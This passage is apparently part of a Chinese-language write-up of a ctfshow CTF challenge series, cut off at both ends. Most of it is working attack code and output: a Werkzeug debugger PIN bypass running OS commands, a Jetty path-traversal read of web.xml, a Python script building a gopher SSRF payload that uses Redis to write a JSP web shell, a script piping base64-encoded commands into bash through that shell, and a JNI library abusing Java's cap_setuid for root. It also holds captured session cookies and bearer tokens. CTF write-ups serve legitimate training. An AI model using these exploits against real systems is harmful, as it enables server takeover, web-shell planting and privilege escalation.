src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_13.png"></p><p>得到pin码后，输入pin码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Debugger pin code: <span class="number">957</span>-<span class="number">930</span>-044</span><br><span class="line"></span><br><span class="line">/set_log_option?__debugger__=yes&amp;cmd=pinauth&amp;pin=<span class="number">957</span>-<span class="number">930</span>-044&amp;s=Kquw5tAtf58SPhAGwWHU</span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://172.2.187.6:8888/set_log_option?__debugger__=yes%2526cmd=pinauth%2526pin=957-930-044%2526s=6ipoh2hrWpXMdN4zEMmg&#x27;</span> --cookie <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3d-Cw.Vdggh-Dhd79zlRivNptX52pUPfU&quot;</span> -i</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_14.png"></p><p>得到cookie，执行命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/console?__debugger__=yes&amp;cmd=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&amp;frm=<span class="number">0</span>&amp;s=vUG6gadIPdCwgON6Iwtc</span><br><span class="line">Cookie: __wzd6f77f3747f58948d6a63=<span class="number">1736167845</span>|61d67b094ccb</span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;http://172.2.187.6:8888/console?__debugger__=yes%2526cmd=print(__import__(&#x27;os&#x27;).popen(&#x27;cat%252509/etc/passwd&#x27;).read())%2526frm=0%2526s=6ipoh2hrWpXMdN4zEMmg&quot;</span> --cookie <span class="string">&quot;__wzd6f77f3747f58948d6a63=1736167845|61d67b094ccb&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_15.png"></p><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;ctfer:x:<span class="number">1000</span>:<span class="number">1000</span>::/home/ctfer:/<span class="built_in">bin</span>/bash&#125;</span><br></pre></td></tr></table></figure><h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a><strong>第五章</strong></h1><p><a href="http://172.2.86.7:8080/">http://172.2.86.7:8080/</a></p><h2 id="艰难的最后一步"><a href="#艰难的最后一步" class="headerlink" title="艰难的最后一步"></a><strong>艰难的最后一步</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Jetty(<span class="number">9.4</span><span class="number">.40</span>.v20210413)</span><br><span class="line"></span><br><span class="line">/downloadTaskFile?url=http://<span class="number">172.2</span><span class="number">.217</span><span class="number">.7</span>:<span class="number">8080</span>/a/b/..%<span class="number">2500</span>/WEB-INF/web.xml</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到web.xml</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="line"> <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><span class="line"></span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 环境参数 --&gt;</span><br><span class="line">  &lt;env-entry&gt;</span><br><span class="line">    &lt;env-entry-name&gt;redis.host&lt;/env-entry-name&gt;</span><br><span class="line">    &lt;env-entry-<span class="built_in">type</span>&gt;java.lang.String&lt;/env-entry-<span class="built_in">type</span>&gt;</span><br><span class="line">    &lt;env-entry-value&gt;localhost&lt;/env-entry-value&gt;</span><br><span class="line">  &lt;/env-entry&gt;</span><br><span class="line"></span><br><span class="line">  &lt;env-entry&gt;</span><br><span class="line">    &lt;env-entry-name&gt;redis.port&lt;/env-entry-name&gt;</span><br><span class="line">    &lt;env-entry-<span class="built_in">type</span>&gt;java.lang.Integer&lt;/env-entry-<span class="built_in">type</span>&gt;</span><br><span class="line">    &lt;env-entry-value&gt;<span class="number">6380</span>&lt;/env-entry-value&gt;</span><br><span class="line">  &lt;/env-entry&gt;</span><br><span class="line"></span><br><span class="line">  &lt;env-entry&gt;</span><br><span class="line">    &lt;env-entry-name&gt;redis.password&lt;/env-entry-name&gt;</span><br><span class="line">    &lt;env-entry-<span class="built_in">type</span>&gt;java.lang.String&lt;/env-entry-<span class="built_in">type</span>&gt;</span><br><span class="line">    &lt;env-entry-value&gt;ctfshow_2025&lt;/env-entry-value&gt;</span><br><span class="line">  &lt;/env-entry&gt;</span><br><span class="line"></span><br><span class="line">  &lt;env-entry&gt;</span><br><span class="line">    &lt;env-entry-name&gt;redis.timeout&lt;/env-entry-name&gt;</span><br><span class="line">    &lt;env-entry-<span class="built_in">type</span>&gt;java.lang.Integer&lt;/env-entry-<span class="built_in">type</span>&gt;</span><br><span class="line">    &lt;env-entry-value&gt;<span class="number">10000</span>&lt;/env-entry-value&gt;</span><br><span class="line">  &lt;/env-entry&gt;</span><br><span class="line"></span><br><span class="line">  &lt;env-entry&gt;</span><br><span class="line">    &lt;env-entry-name&gt;app_root&lt;/env-entry-name&gt;</span><br><span class="line">    &lt;env-entry-<span class="built_in">type</span>&gt;java.lang.String&lt;/env-entry-<span class="built_in">type</span>&gt;</span><br><span class="line">    &lt;env-entry-value&gt;/opt/jetty/webapps/ROOT/&lt;/env-entry-value&gt;</span><br><span class="line">  &lt;/env-entry&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p><strong>redis的密码</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfshow_2025</span><br><span class="line">ctfshow&#123;ctfshow_2025&#125;</span><br><span class="line"></span><br><span class="line">port: <span class="number">6380</span></span><br></pre></td></tr></table></figure><h2 id="功亏一篑"><a href="#功亏一篑" class="headerlink" title="功亏一篑"></a><strong>功亏一篑</strong></h2><p>用curl打redis写马</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;172.2.187.7&quot;</span></span><br><span class="line">port=<span class="string">&quot;6380&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;% Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;));%&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;aa.jsp&quot;</span></span><br><span class="line">path=<span class="string">&quot;/opt/jetty/webapps/ROOT/&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;ctfshow_2025&quot;</span>        <span class="comment">#如果无密码就不加，如果有密码就加 </span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        tmp += urllib.parse.quote(redis_format(x))</span><br><span class="line">    tmp = urllib.parse.quote(tmp)</span><br><span class="line">    payload += urllib.parse.quote(tmp)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gopher://<span class="number">172.2</span><span class="number">.187</span><span class="number">.7</span>:<span class="number">6380</span>/_%25252A2%25250D%25250A%<span class="number">2525244</span>%25250D%25250AAUTH%25250D%25250A%<span class="number">25252412</span>%25250D%25250Actfshow_2025%25250D%25250A%25252A1%25250D%25250A%<span class="number">2525248</span>%25250D%25250Aflushall%25250D%25250A%25252A3%25250D%25250A%<span class="number">2525243</span>%25250D%25250Aset%25250D%25250A%<span class="number">2525241</span>%25250D%25250A1%25250D%25250A%<span class="number">25252464</span>%25250D%25250A%25250A%25250A%25253C%<span class="number">252525</span>%252520Runtime.getRuntime%<span class="number">252528</span>%<span class="number">252529.</span><span class="built_in">exec</span>%252528request.getParameter%<span class="number">252528</span>%252522cmd%<span class="number">252522</span>%<span class="number">252529</span>%<span class="number">252529</span>%25253B%<span class="number">252525</span>%25253E%25250A%25250A%25250D%25250A%25252A4%25250D%25250A%<span class="number">2525246</span>%25250D%25250Aconfig%25250D%25250A%<span class="number">2525243</span>%25250D%25250Aset%25250D%25250A%<span class="number">2525243</span>%25250D%25250Adir%25250D%25250A%<span class="number">25252424</span>%25250D%25250A/opt/jetty/webapps/ROOT/%25250D%25250A%25252A4%25250D%25250A%<span class="number">2525246</span>%25250D%25250Aconfig%25250D%25250A%<span class="number">2525243</span>%25250D%25250Aset%25250D%25250A%<span class="number">25252410</span>%25250D%25250Adbfilename%25250D%25250A%<span class="number">2525246</span>%25250D%25250Aaa.jsp%25250D%25250A%25252A1%25250D%25250A%<span class="number">2525244</span>%25250D%25250Asave%25250D%25250A</span><br></pre></td></tr></table></figure><p>发送过去即可写入一句话无回显的马</p><p>写一个脚本实现回显</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResule</span>():</span><br><span class="line">    burp0_url = <span class="string">&quot;http://c01975ab-f05f-48da-a729-614f59220d15.challenge.ctf.show/downloadTaskFile?url=http://172.2.187.7:8080/a/b/..%2500/WEB-INF/1.txt&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>, <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNjI0NTg1OH0.04T2Ni6yKu4C-pBK4-oUKxrQ6K5C8q34xwdhCvNNhZA&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>, <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;131\&quot;, \&quot;Chromium\&quot;;v=\&quot;131\&quot;, \&quot;Not_A Brand\&quot;;v=\&quot;24\&quot;&quot;</span>, <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://task.ctfer.com&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;cross-site&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>, <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://task.ctfer.com/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> json.loads(requests.get(burp0_url, headers=burp0_headers).text)[<span class="string">&#x27;file_content&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">cmd</span>):</span><br><span class="line">    new_cmd = <span class="string">&#x27;bash -c &#123;echo,[cmd]&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>.replace(<span class="string">&#x27;[cmd]&#x27;</span>,base64.b64encode(cmd).decode())</span><br><span class="line">    new_cmd = urllib.parse.quote(new_cmd)</span><br><span class="line">    new_cmd = urllib.parse.quote(new_cmd)</span><br><span class="line">    burp0_url = <span class="string">f&quot;http://c01975ab-f05f-48da-a729-614f59220d15.challenge.ctf.show/downloadTaskFile?url=http://172.2.187.7:8080/aa.jsp?cmd=<span class="subst">&#123;new_cmd&#125;</span>&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>, <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNjI0NTg1OH0.04T2Ni6yKu4C-pBK4-oUKxrQ6K5C8q34xwdhCvNNhZA&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>, <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;131\&quot;, \&quot;Chromium\&quot;;v=\&quot;131\&quot;, \&quot;Not_A Brand\&quot;;v=\&quot;24\&quot;&quot;</span>, <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://task.ctfer.com&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;cross-site&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>, <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://task.ctfer.com/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">    requests.get(burp0_url, headers=burp0_headers)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&#x27;cat /dylan.txt &gt;/opt/jetty/webapps/ROOT/WEB-INF/1.txt&#x27;</span></span><br><span class="line">send(cmd)</span><br><span class="line"><span class="built_in">print</span>(getResule())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/image_16.png"></p><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">The enemy cyber attacker <span class="number">81192</span> has been injected <span class="keyword">with</span> prions by our agents, </span><br><span class="line"><span class="keyword">and</span> there <span class="keyword">is</span> no chance of survival, victory <span class="keyword">is</span> ours! </span><br><span class="line">The key <span class="keyword">is</span> 7b11a7ae330883cb5bf667a9c1604635.</span><br><span class="line"></span><br><span class="line">ctfshow&#123;7b11a7ae330883cb5bf667a9c1604635&#125;</span><br></pre></td></tr></table></figure><h2 id="今日方知我是我"><a href="#今日方知我是我" class="headerlink" title="今日方知我是我"></a><strong>今日方知我是我</strong></h2><p>提权</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/local/openjdk-<span class="number">8</span>/<span class="built_in">bin</span>/java = cap_setuid+ep</span><br></pre></td></tr></table></figure><p>发现java有setuid权限，写jni提权，可以参考单身杯的文件上传</p><p>JniClass.c</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;jni.h&gt;</span></span><br><span class="line"><span class="comment">#include &quot;NativeLibraryExample.h&quot;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> execmd(const char *cmd, char *result)</span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    char buffer[<span class="number">1024</span>*<span class="number">12</span>];              //定义缓冲区</span><br><span class="line">    FILE *pipe = popen(cmd, <span class="string">&quot;r&quot;</span>); //打开管道，并执行命令</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; //返回<span class="number">0</span>表示运行失败</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(pipe))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fgets(buffer, sizeof(buffer), pipe))</span><br><span class="line">        &#123; //将管道输出到result中</span><br><span class="line">            strcat(result, buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(pipe); //关闭管道</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;      //返回<span class="number">1</span>表示运行成功</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_NativeLibraryExample_nativeMethod(JNIEnv *env, jobject obj, jstring jstr)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    const char *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, NULL);</span><br><span class="line">    char result[<span class="number">1024</span> * <span class="number">12</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == execmd(cstr, result))</span><br><span class="line">    &#123;</span><br><span class="line">       // printf(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char return_messge[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    strcat(return_messge, result);</span><br><span class="line">    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);</span><br><span class="line">    //system();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmdresult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    public native void nativeMethod(String cmd);</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.load(<span class="string">&quot;/tmp/libcmd.so&quot;</span>);</span><br><span class="line">        NativeLibraryExample example = new NativeLibraryExample();</span><br><span class="line"></span><br><span class="line">        example.nativeMethod(<span class="string">&quot;cat /root/message.txt &gt; /tmp/2.txt&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResule</span>():</span><br><span class="line">    burp0_url = <span class="string">&quot;http://c01975ab-f05f-48da-a729-614f59220d15.challenge.ctf.show/downloadTaskFile?url=http://172.2.187.7:8080/a/b/..%2500/WEB-INF/1.txt&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>, <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNjI0NTg1OH0.04T2Ni6yKu4C-pBK4-oUKxrQ6K5C8q34xwdhCvNNhZA&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>, <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;131\&quot;, \&quot;Chromium\&quot;;v=\&quot;131\&quot;, \&quot;Not_A Brand\&quot;;v=\&quot;24\&quot;&quot;</span>, <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://task.ctfer.com&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;cross-site&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>, <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://task.ctfer.com/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> json.loads(requests.get(burp0_url, headers=burp0_headers).text)[<span class="string">&#x27;file_content&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">cmd</span>):</span><br><span class="line">    new_cmd = <span class="string">&#x27;bash -c &#123;echo,[cmd]&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>.replace(<span class="string">&#x27;[cmd]&#x27;</span>,base64.b64encode(cmd).decode())</span><br><span class="line">    new_cmd = urllib.parse.quote(new_cmd)</span><br><span class="line">    new_cmd = urllib.parse.quote(new_cmd)</span><br><span class="line">    burp0_url = <span class="string">f&quot;http://c01975ab-f05f-48da-a729-614f59220d15.challenge.ctf.show/downloadTaskFile?url=http://172.2.187.7:8080/aa.jsp?cmd=<span class="subst">&#123;new_cmd&#125;</span>&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>, <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNjI0NTg1OH0.04T2Ni6yKu4C-pBK4-oUKxrQ6K5C8q34xwdhCvNNhZA&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>, <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;131\&quot;, \&quot;Chromium\&quot;;v=\&quot;131\&quot;, \&quot;Not_A Brand\&quot;;v=\&quot;24\&quot;&quot;</span>, <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://task.ctfer.com&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;cross-site&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>, <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://task.ctfer.com/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">    requests.get(burp0_url, headers=burp0_headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /usr/local/openjdk-8/bin/java = cap_setuid+ep</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;echo cHVibGljIGNsYXNzIE5hdGl2ZUxpYnJhcnlFeGFtcGxlIHsKICAgIC8vIOWjsOaYjm5hdGl2ZeaWueazlQogICAgcHVibGljIG5hdGl2ZSB2b2lkIG5hdGl2ZU1ldGhvZChTdHJpbmcgY21kKTsKCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB7CgogICAgICAgIE5hdGl2ZUxpYnJhcnlFeGFtcGxlIGV4YW1wbGUgPSBuZXcgTmF0aXZlTGlicmFyeUV4YW1wbGUoKTsKCiAgICAgICAgZXhhbXBsZS5uYXRpdmVNZXRob2QoIm1hdGUtY2FsYyIpOyAvLyDosIPnlKhuYXRpdmXmlrnms5UKICAgIH0KfQ==|base64 -d &gt;/tmp/NativeLibraryExample.java&quot;</span></span><br><span class="line">cmd = <span class="string">b&quot;cd /tmp;javac NativeLibraryExample.java&quot;</span></span><br><span class="line">cmd = <span class="string">b&quot;cd /tmp;javah -jni NativeLibraryExample&quot;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;echo 